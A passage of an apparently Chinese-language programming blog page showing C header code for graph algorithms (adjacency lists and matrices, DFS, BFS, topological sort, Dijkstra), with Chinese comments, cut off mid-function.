class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20<span class="comment">//预定义图的最大顶点数</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> visited[M];  <span class="comment">//作为访问的标记</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//邻接表创建 图结构定义 </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> DataType;<span class="comment">//顶点信息数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span><span class="comment">//边表结点</span></span><br><span class="line">    <span class="keyword">int</span> adjvex;<span class="comment">//邻接点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span><span class="comment">//指向下一个邻接点</span></span><br><span class="line">&#125;EdgeNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">vnode</span>&#123;</span><span class="comment">//头结点类型</span></span><br><span class="line">    DataType vertex;<span class="comment">//顶点信息</span></span><br><span class="line">    EdgeNode *FirstEdge;<span class="comment">//邻接链表头指针</span></span><br><span class="line">&#125;VertexNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">linkedgraph</span>&#123;</span><span class="comment">//邻接表 类型</span></span><br><span class="line">    VertexNode adjlist[M];<span class="comment">//存放头结点的顺序表</span></span><br><span class="line">    <span class="keyword">int</span> n,e;  <span class="comment">//图的顶点数、边数</span></span><br><span class="line">&#125;LinkedGraph;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//邻接表 创建图</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_1</span><span class="params">(LinkedGraph *g,<span class="keyword">char</span> *filename,<span class="keyword">int</span> c)</span></span>&#123;  <span class="comment">//c=0 表示建立无向图</span></span><br><span class="line">    <span class="keyword">int</span> i,j,k;</span><br><span class="line">    EdgeNode *s;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = <span class="built_in">fopen</span>(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp)&#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);<span class="comment">//读入顶点数与边数</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g-&gt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%ls&quot;</span>,&amp;g-&gt;adjlist[i].vertex); <span class="comment">//读入顶点信息</span></span><br><span class="line">            g-&gt;adjlist[i].FirstEdge = <span class="literal">NULL</span>;    <span class="comment">//边表置为空表</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">for</span>(k=<span class="number">0</span>; k &lt; g-&gt;e; k++)&#123;</span><br><span class="line"><span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;i,&amp;j);<span class="comment">//输入无序对</span></span><br><span class="line">s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(EdgeNode));</span><br><span class="line">s-&gt;adjvex = j;</span><br><span class="line">s-&gt;next = g-&gt;adjlist[i].FirstEdge;</span><br><span class="line">g-&gt;adjlist[i].FirstEdge = s;       <span class="comment">//相当于 前插</span></span><br><span class="line"><span class="keyword">if</span>(c == <span class="number">0</span>)&#123;<span class="comment">//无向图</span></span><br><span class="line">s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(EdgeNode));</span><br><span class="line">s-&gt;adjvex = i;</span><br><span class="line">s-&gt;next = g-&gt;adjlist[j].FirstEdge;</span><br><span class="line">g-&gt;adjlist[j].FirstEdge = s;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">fclose</span>(fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//文件打开失败</span></span><br><span class="line">g-&gt;n = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">printf(&quot;%d,%d&quot;,g-&gt;n,g-&gt;e);</span></span><br><span class="line"><span class="comment">printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">for(i=0;i&lt;g-&gt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">printf(&quot;%c&quot;,g-&gt;adjlist[i].vertex);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//深度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;访问顶点：%c\n&quot;</span>,g.adjlist[i].vertex); <span class="comment">//访问顶点 i</span></span><br><span class="line">    visited[i] = <span class="number">1</span>;<span class="comment">//表示已经访问过</span></span><br><span class="line">    p = g.adjlist[i].FirstEdge;<span class="comment">//从 p 的邻接点开始进行 深度优先遍历</span></span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[p-&gt;adjvex])</span><br><span class="line">            <span class="built_in">dfs</span>(g,p-&gt;adjvex);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt;g.n; i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;   <span class="comment">//初始化都为 0 ，代表都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g.n; i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])<span class="comment">//如果 i 未被访问过</span></span><br><span class="line">            <span class="built_in">dfs</span>(g,i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//广度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="keyword">int</span> queue[M],front,rear;  <span class="comment">//FIFO 队列</span></span><br><span class="line">    front = rear = <span class="number">0</span>; <span class="comment">//初始化空队列</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[i].vertex);</span><br><span class="line">    visited[i] = <span class="number">1</span>;</span><br><span class="line">    queue[rear++] = i;<span class="comment">//被访问结点进入队列</span></span><br><span class="line">    <span class="keyword">while</span>(rear &gt; front)&#123;</span><br><span class="line">        j = queue[front++]; <span class="comment">// 出队</span></span><br><span class="line">        p = g.adjlist[j].FirstEdge;</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited[p-&gt;adjvex] == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[p-&gt;adjvex].vertex);</span><br><span class="line">                queue[rear++] = p-&gt;adjvex;</span><br><span class="line">                visited[p-&gt;adjvex] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回连通分量的个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;  <span class="comment">//初始化标志数组，都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g.n ;i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])&#123;<span class="comment">//vi未被访问过</span></span><br><span class="line">            <span class="comment">//printf(&quot;\n&quot;);</span></span><br><span class="line">            count++;<span class="comment">//计数器：连通分量 个数加1 </span></span><br><span class="line">            <span class="built_in">bfs</span>(g,i);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="m-graph-h"><a href="#m-graph-h" class="headerlink" title="m_graph.h"></a>m_graph.h</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FINITY 5000<span class="comment">//此处使用 5000 表示无穷大</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20<span class="comment">//最大顶点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> vertextype;<span class="comment">//顶点值类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> edgetype;<span class="comment">//权值类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">mgraph</span>&#123;</span><span class="comment">//邻接矩阵 类型</span></span><br><span class="line">    vertextype vexs[M];  <span class="comment">//顶点信息域（一维数组）</span></span><br><span class="line">    edgetype edges[M][M];  <span class="comment">//邻接矩阵（二维数组）</span></span><br><span class="line">    <span class="keyword">int</span> n,e;<span class="comment">//图中顶点总数 与 边数</span></span><br><span class="line">&#125;Mgraph;</span><br><span class="line"></span><br><span class="line"><span class="comment">//建立网络邻接矩阵 创建 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_2</span><span class="params">(Mgraph *g,<span class="keyword">char</span> *s,<span class="keyword">int</span> c)</span></span>&#123;  <span class="comment">//c=1表示建立有向图，c=0 表示建立无向图</span></span><br><span class="line">    <span class="keyword">int</span> i,j,k,w;</span><br><span class="line">    FILE *rf;</span><br><span class="line">    rf = <span class="built_in">fopen</span>(s,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(rf)&#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g-&gt;n;i++)</span><br><span class="line">            <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%ls&quot;</span>,&amp;g-&gt;vexs[i]);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g-&gt;n;i++)</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;g-&gt;n;j++)</span><br><span class="line">                <span class="keyword">if</span>(i == j)</span><br><span class="line">g-&gt;edges[i][j] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">                    g-&gt;edges[i][j] = FINITY;</span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;g-&gt;e;k++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%d%d%d&quot;</span>,&amp;i,&amp;j,&amp;w);</span><br><span class="line">            g-&gt;edges[i][j] = w;</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="number">0</span>)</span><br><span class="line">                g-&gt;edges[j][i] = w;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">fclose</span>(rf);    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        g-&gt;n = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="r-graph-h"><a href="#r-graph-h" class="headerlink" title="r_graph.h"></a>r_graph.h</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> vertextype;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带入度邻接表 存储结构 定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">aov_node</span>&#123;</span>  <span class="comment">//边结点类型定义</span></span><br><span class="line"><span class="keyword">int</span> adjvex;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">aov_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;edgenode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">de</span>&#123;</span>  <span class="comment">//带顶点入度的头结点定义</span></span><br><span class="line">edgenode *FirstEdge;</span><br><span class="line">vertextype vertex;</span><br><span class="line"><span class="keyword">int</span> id;<span class="comment">//顶点的入度域</span></span><br><span class="line">&#125;vertexnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">aovgraph</span>&#123;</span><span class="comment">// AOV 网络的邻接表结构</span></span><br><span class="line">vertexnode adjlist[M];</span><br><span class="line"><span class="keyword">int</span> n,e;</span><br><span class="line">&#125;AovGraph;</span><br><span class="line"></span><br><span class="line"><span class="comment">//AOV 网络 邻接表 创建图</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">create_3</span><span class="params">(AovGraph *g,<span class="keyword">char</span> *filename,<span class="keyword">int</span> c)</span>       <span class="comment">/*建立AOV网络的存储结构*/</span></span></span><br><span class="line"><span class="function"> </span>&#123; <span class="keyword">int</span> i,j,k;</span><br><span class="line">   edgenode  *s;</span><br><span class="line">   FILE *fp;</span><br><span class="line">   fp=<span class="built_in">fopen</span>(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span> (fp)</span><br><span class="line">   &#123;</span><br><span class="line">   <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);  <span class="comment">/*输入图中的顶点数与边数*/</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g-&gt;n;i++)                        <span class="comment">/*输入顶点值*/</span></span><br><span class="line">      &#123;<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%1s&quot;</span>,&amp;g-&gt;adjlist[i].vertex);</span><br><span class="line">       g-&gt;adjlist[i].FirstEdge=<span class="literal">NULL</span>;</span><br><span class="line">       g-&gt;adjlist[i].id=<span class="number">0</span>;       <span class="comment">/*入度初始化为0*/</span></span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;g-&gt;e;k++)</span><br><span class="line">        &#123; <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;i,&amp;j);</span><br><span class="line">         s=(edgenode*)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(edgenode));</span><br><span class="line">         s-&gt;adjvex=j;</span><br><span class="line">         g-&gt;adjlist[j].id++;    <span class="comment">/*顶点j的入度加1*/</span></span><br><span class="line">         s-&gt;next=g-&gt;adjlist[i].FirstEdge;</span><br><span class="line">         g-&gt;adjlist[i].FirstEdge=s;</span><br><span class="line"> <span class="keyword">if</span>(c == <span class="number">0</span>)&#123;<span class="comment">//无向图</span></span><br><span class="line">s = (edgenode *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(edgenode));</span><br><span class="line">s-&gt;adjvex = i;</span><br><span class="line">s-&gt;next = g-&gt;adjlist[j].FirstEdge;</span><br><span class="line">g-&gt;adjlist[j].FirstEdge = s;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">fclose</span>(fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//文件打开失败</span></span><br><span class="line">g-&gt;n = <span class="number">0</span>; </span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//拓扑排序 算法 (队列 实现)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">TopSort</span><span class="params">(AovGraph g)</span></span></span><br><span class="line"><span class="function"> </span>&#123;<span class="keyword">int</span> k=<span class="number">0</span>,i,j,v, flag[M];</span><br><span class="line">   <span class="keyword">int</span> queue[M];  <span class="comment">/*队列*/</span></span><br><span class="line">   <span class="keyword">int</span> h=<span class="number">0</span>,t=<span class="number">0</span>;</span><br><span class="line">   edgenode* p;</span><br><span class="line">   <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;g.n;i++)  flag[i]=<span class="number">0</span>;  <span class="comment">/*访问标记初始化*/</span></span><br><span class="line">    <span class="comment">/*先将所有入度为0的结点进队*/</span></span><br><span class="line">    <span class="comment">/*将程序补充完整*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">        <span class="keyword">if</span> (g.adjlist[i].id==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            queue[t++]=i;</span><br><span class="line">            flag[i]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">   <span class="keyword">while</span> (h&lt;t)</span><br><span class="line">   &#123;</span><br><span class="line">       v=queue[h++];</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[v].vertex);</span><br><span class="line">       k++;</span><br><span class="line">       p=g.adjlist[v].FirstEdge;</span><br><span class="line">       <span class="keyword">while</span> (p)</span><br><span class="line">       &#123;</span><br><span class="line">           j=p-&gt;adjvex;</span><br><span class="line">           g.adjlist[j].id--;</span><br><span class="line">           <span class="keyword">if</span> (g.adjlist[j].id==<span class="number">0</span> &amp;&amp; flag[j]==<span class="number">0</span>)</span><br><span class="line">           &#123;  queue[t++]=j;</span><br><span class="line">               flag[j]=<span class="number">1</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           p=p-&gt;next;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">return</span> k;  <span class="comment">//返回输出的顶点个数</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//打印 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(AovGraph g)</span></span></span><br><span class="line"><span class="function"></span>&#123;  edgenode *p;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">   &#123; <span class="built_in">printf</span>(<span class="string">&quot;%c %d   &quot;</span>, g.adjlist[i].vertex,g.adjlist[i].id);</span><br><span class="line">     p=g.adjlist[i].FirstEdge;</span><br><span class="line">     <span class="keyword">while</span> (p)</span><br><span class="line">      &#123; <span class="built_in">printf</span>(<span class="string">&quot;%d--&gt;&quot;</span>,p-&gt;adjvex);</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">      &#125;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="min-h"><a href="#min-h" class="headerlink" title="min.h"></a>min.h</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;m_graph.h&quot;</span>  <span class="comment">//邻接矩阵创建 图</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span>&#123;</span>FALSE,TRUE&#125; boolean;<span class="comment">//false 0   true 1</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> dist[M];<span class="comment">//距离向量类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> path[M];<span class="comment">//路径类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Dijkastra 算法求 单源最短路径</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(Mgraph g,<span class="keyword">int</span> v0,path p,dist d)</span></span>&#123;</span><br><span class="line">    boolean <span class="keyword">final</span>[M]; <span class="comment">//标志 当前元素是否已经求出 最短路径</span></span><br><span class="line">    <span class="keyword">int</span> i,k,j,v,min,x;</span><br><span class="line">    <span class="comment">//初始化集合 S 与距离向量 d</span></span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>; v&lt;g.n; v++)&#123;</span><br><span class="line">        <span class="keyword">final</span>[v] = FALSE;</span><br><span class="line">        d[v] = g.edges[v0][v];</span><br><span class="line">        <span class="keyword">if</span>(d[v]&lt;FINITY &amp;&amp; d[v] != <span class="number">0</span>)</span><br><span class="line">            p[v] = v0;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p[v] = <span class="number">-1</span>;  <span class="comment">//v 无前驱</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span>[v0] = TRUE;</span><br><span class="line">    d[v0] = <span class="number">0</span>;<span class="comment">//初始时 s 只有 v0 一个结点</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//依次找出 n-1 个结点加入 S 中</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;g.n; i++)&#123;</span><br><span class="line">        min = FINITY;</span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>; k&lt;g.n; ++k)  <span class="comment">//找最小边入结点</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">final</span>[k] &amp;&amp; d[k] &lt; min)&#123;</span><br><span class="line">                v = k;</span><br><span class="line">                min = d[k];</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//测试：可省略</span></span><br><span class="line">        <span class="comment">//printf(&quot;\n%c----%d\n&quot;,g.vexs[v],min);</span></span><br><span class="line">        <span class="keyword">if</span>(min == FINITY)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">final</span>[v] = TRUE;  <span class="comment">//v 加入 S</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//修改 S 与 V-S 中各节点的距离</span></span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>; k&lt;g.n; ++k)</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">final</span>[k] &amp;&amp; (min+g.edges[v][k] &lt; d[k]) )&#123;</span><br><span class="line">                d[k] = min + g.edges[v][k];</span><br><span class="line">                p[k] = v;</span><br><span class="line">            &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出 有向图 最短路径</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_gpd</span><span class="params">(Mgraph g,path p,dist d)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> st[M],i,pre,top=<span class="number">-1</span>;<span class="comment">//定义栈 st 初始化空栈</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;v0 到各个顶点的距离以及最短路径：\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g.n; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n距离：%2d，\t最短路径：&quot;</span>,d[i]);</span><br><span class="line">        st[++top] = i;</span><br><span 